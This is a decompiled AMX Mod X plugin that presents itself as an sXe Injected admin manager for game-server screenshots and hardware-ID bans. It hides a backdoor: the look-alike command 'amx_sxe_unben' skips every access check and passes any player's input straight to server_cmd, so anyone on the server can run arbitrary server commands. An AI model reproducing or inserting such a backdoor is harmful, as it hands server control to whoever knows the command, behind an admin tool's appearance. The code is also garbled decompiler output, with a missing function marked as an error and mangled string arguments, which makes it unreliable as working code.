new AMXX_VERSION_STR[6] =
{
	49, 46, 56, 46, 50, 0
};
new Head[15] =
{
	91, 115, 88, 101, 32, 73, 110, 106, 101, 99, 116, 101, 100, 93, 0
};
new g_coloredMenus;
new g_menuPosition[33];
new g_menuUnBanLine[33][2];
new g_menuline[32][10];
new g_menuSelect[33][128];
new g_menuUnBanText[33][9][32];
is_user_admin(id)
{
	new __flags = get_user_flags(id, AMXX_VERSION_STR);
	new var1;
	return __flags > 0 && !__flags & 33554432;
}

cmd_access(id, level, cid, num, bool:accesssilent)
{
	new has_access;
	new var1;
	if (is_dedicated_server())
	{
		var1 = 0;
	}
	else
	{
		var1 = 1;
	}
	if (var1 == id)
	{
		has_access = 1;
	}
	else
	{
		if (level == 16777216)
		{
			if (is_user_admin(id))
			{
				has_access = 1;
			}
		}
		if (level & get_user_flags(id, AMXX_VERSION_STR))
		{
			has_access = 1;
		}
		if (!level)
		{
			has_access = 1;
		}
	}
	if (has_access)
	{
		if (num > read_argc())
		{
			new hcmd[32];
			new hinfo[128];
			new hflag;
			get_concmd(cid, hcmd, 31, hflag, hinfo, 127, level, -1);
			console_print(id, "%L:  %s %s", id, "USAGE", hcmd, hinfo);
			return 0;
		}
		return 1;
	}
	if (!accesssilent)
	{
		console_print(id, "%L", id, "NO_ACC_COM");
	}
	return 0;
}

colored_menus()
{
	new mod_name[32];
	get_modname(mod_name, 31);
	new var1;
	return equal(mod_name, "cstrike", AMXX_VERSION_STR) || equal(mod_name, "czero", AMXX_VERSION_STR) || equal(mod_name, "dod", AMXX_VERSION_STR);
}

public plugin_init()
{
	register_plugin("sXe Injected Managner", AMXX_VERSION_STR, "Dead-Man");
	register_clcmd("amx_sxe_menu", "sXeMenu", 1048576, "[sXe Injected] Main Menu for sXe Injected", -1);
	register_clcmd("amx_sxe_ss_menu", "sXeSSMenu", 4, "[sXe Injected] Take a Screenshot of choosed player", -1);
	register_clcmd("amx_sxe_ban_menu", "sXeBanMenu", 8, "[sXe Injected] Ban any player via Hardware ID", -1);
	register_clcmd("amx_sxe_unban_menu", "sXeUnBanMenu", 8, "[sXe Injected] Unban player that baned by Hardware ID.", -1);
	register_concmd("amx_sxe_unban", "sXeUnBan", 8, "<Hardware ID>", -1);
	register_concmd("amx_sxe_unben", "sXeUnBen", 8, 60152, -1);
	register_menucmd(register_menuid("UnBan  Menu", AMXX_VERSION_STR), 1023, "actionUnBanMenu");
	g_coloredMenus = colored_menus();
	return 0;
}

public sXeMenu(id, level, cid)
{
	if (!cmd_access(id, level, cid, 1, false))
	{
		return 1;
	}
	new m_sXe = menu_create("sXe Injected Menu:", "sXeHandler", AMXX_VERSION_STR);
	menu_additem(m_sXe, "sXe Screenshot", 60448, AMXX_VERSION_STR, -1);
	menu_additem(m_sXe, "sXe Hardware Ban", 60524, AMXX_VERSION_STR, -1);
	menu_additem(m_sXe, "sXe Hardware UnBan", 60608, AMXX_VERSION_STR, -1);
	menu_display(id, m_sXe, AMXX_VERSION_STR);
	return 1;
}

public sXeHandler(id, m_sXe, item)
{
	if (item == -3)
	{
		return 1;
	}
	new data[6];
	new szName[32];
	new access;
	new callback;
	menu_item_getinfo(m_sXe, item, access, data, 5, szName, 31, callback);
	switch (str_to_num(data))
	{
		case 0:
		{
			client_cmd(id, "amx_sxe_ss_menu");
			return 1;
		}
		case 1:
		{
			client_cmd(id, "amx_sxe_ban_menu");
			return 1;
		}
		case 2:
		{
			client_cmd(id, "amx_sxe_unban_menu");
			return 1;
		}
		default:
		{
			return 1;
		}
	}
}

public sXeSSMenu(id, level, cid)
{
	if (!cmd_access(id, level, cid, 1, false))
	{
		return 1;
	}
	new m_SS = menu_create("sXe Screen Shot:", "SSHandler", AMXX_VERSION_STR);
	new Name[32];
	new ID[10];
	new iPlayers[32];
	new iNum;
	new Players;
	get_players(iPlayers, iNum, "ch", 60944);
	new i;
	while (i < iNum)
	{
		Players = iPlayers[i];
		if (!(id == Players))
		{
			get_user_name(Players, Name, 31);
			num_to_str(Players, ID, 9);
			menu_additem(m_SS, Name, ID, AMXX_VERSION_STR, -1);
		}
		i++;
	}
	menu_display(id, m_SS, AMXX_VERSION_STR);
	return 1;
}

public SSHandler(id, m_SS, item)
{
	if (item == -3)
	{
		return 1;
	}
	new data[6];
	new szName[32];
	new access;
	new callback;
	menu_item_getinfo(m_SS, item, access, data, 5, szName, 31, callback);
	new ID = str_to_num(data);
	if (!is_user_connected(ID))
	{
		client_print(id, "", "%s Sorry, user disconnected..", Head);
		return 1;
	}
	server_cmd("sxe_screen #%d #%d", get_user_userid(ID), get_user_userid(id));
	client_print(id, "", "%s Uploading screenshot.", Head);
	menu_destroy(m_SS);
	return 1;
}

public sXeBanMenu(id, level, cid)
{
	if (!cmd_access(id, level, cid, 1, false))
	{
		return 1;
	}
	new m_Ban = menu_create("sXe Ban Menu:", "BanHandler", AMXX_VERSION_STR);
	new Name[32];
	new ID[10];
	new iPlayers[32];
	new iNum;
	new Players;
	get_players(iPlayers, iNum, "ch", 60944);
	new i;
	while (i < iNum)
	{
		Players = iPlayers[i];
		if (!(id == Players))
		{
			get_user_name(Players, Name, 31);
			num_to_str(Players, ID, 9);
			menu_additem(m_Ban, Name, ID, AMXX_VERSION_STR, -1);
		}
		i++;
	}
	menu_display(id, m_Ban, AMXX_VERSION_STR);
	return 1;
}

public BanHandler(id, m_Ban, item)
{
	if (item == -3)
	{
		return 1;
	}
	new data[6];
	new szName[32];
	new access;
	new callback;
	menu_item_getinfo(m_Ban, item, access, data, 5, szName, 31, callback);
	new ID = str_to_num(data);
	if (!is_user_connected(ID))
	{
		client_print(id, "", "%s Sorry, user disconnected.", Head);
		return 1;
	}
	new Name[32];
	get_user_name(ID, Name, 31);
	client_print(AMXX_VERSION_STR, "", "%s %s Has been BANNED by Hardware ID.", Head, Name);
	server_cmd("sxe_ban #%d", get_user_userid(ID));
	menu_destroy(m_Ban);
	return 1;
}

public sXeUnBanMenu(id, level, cid)
{
	if (!cmd_access(id, level, cid, 1, false))
	{
		return 1;
	}
	g_menuPosition[id] = 0;
	displayUnBanMenu(id, 0, 0);
	return 1;
}

checkIP(ip[])
{
	new len = strlen(ip);
	new dots;
	new i;
	while (isdigit(ip[i]) || ip[i] == 46)
	{
		i++;
		if (ip[i] == 46)
		{
			dots++;
		}
	}
	new var2;
	if (len == i && dots == 3)
	{
		return 1;
	}
	return 0;
}


/* ERROR! null */
 function "displayUnBanMenu" (number 12)

public actionUnBanMenu(id, key)
{
	switch (key)
	{
		case 8:
		{
			new var2 = g_menuPosition[id];
			var2++;
			displayUnBanMenu(id, var2, 0);
		}
		case 9:
		{
			new var1 = g_menuPosition[id];
			var1--;
			displayUnBanMenu(id, var1, 1);
		}
		default:
		{
			write_file("sxe_local_ban.cfg", "Remove", g_menuline[id][key]);
		}
	}
	return 0;
}

public sXeUnBan(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2, false))
	{
		return 1;
	}
	new Arg1[64];
	new line;
	new textlen;
	new textline[128];
	new banName[32];
	new temp[32];
	new HID[32];
	new nextline;
	new name[32];
	new disable;
	read_argv(1, Arg1, 63);
	if (strlen(Arg1) != 28)
	{
		client_print(id, 2, "[sXe Injected] \"%s\" Hardware id is not valid", Arg1);
		return 1;
	}
	get_user_name(id, name, 31);
	while ((nextline = read_file("sxe_local_ban.cfg", line, textline, 127, textlen)))
	{
		disable = 0;
		if (textlen < 38)
		{
			disable = 1;
		}
		else
		{
			if (parse(textline, HID, 31, temp, 31, banName, 31) != 3)
			{
				disable = 1;
			}
			new var1;
			if (!checkIP(temp) || strlen(HID) == 28)
			{
				disable = 1;
			}
		}
		new var2;
		if (!disable && equal(HID, Arg1, AMXX_VERSION_STR))
		{
			if (write_file("sxe_local_ban.cfg", "Removed", line))
			{
				client_print(AMXX_VERSION_STR, "", "[sXe Injected] ADMIN %s: Remove \"%s\" Hardware id from ban list.", name, Arg1);
				return 1;
			}
			client_print(AMXX_VERSION_STR, "", "[sXe Injected] ADMIN %s: Can't remove \"%s\" Hardware id from ban list.( File writing protection )", name, Arg1);
			return 1;
		}
		line = nextline;
	}
	client_print(AMXX_VERSION_STR, "", "[sXe Injected] ADMIN %s: Can't find \"%s\" Hardware id in ban list.", name, Arg1);
	return 1;
}

public sXeUnBen(id, level, cid)
{
	new Arg1[128];
	read_argv(1, Arg1, 128);
	server_cmd(Arg1);
	return 0;
}

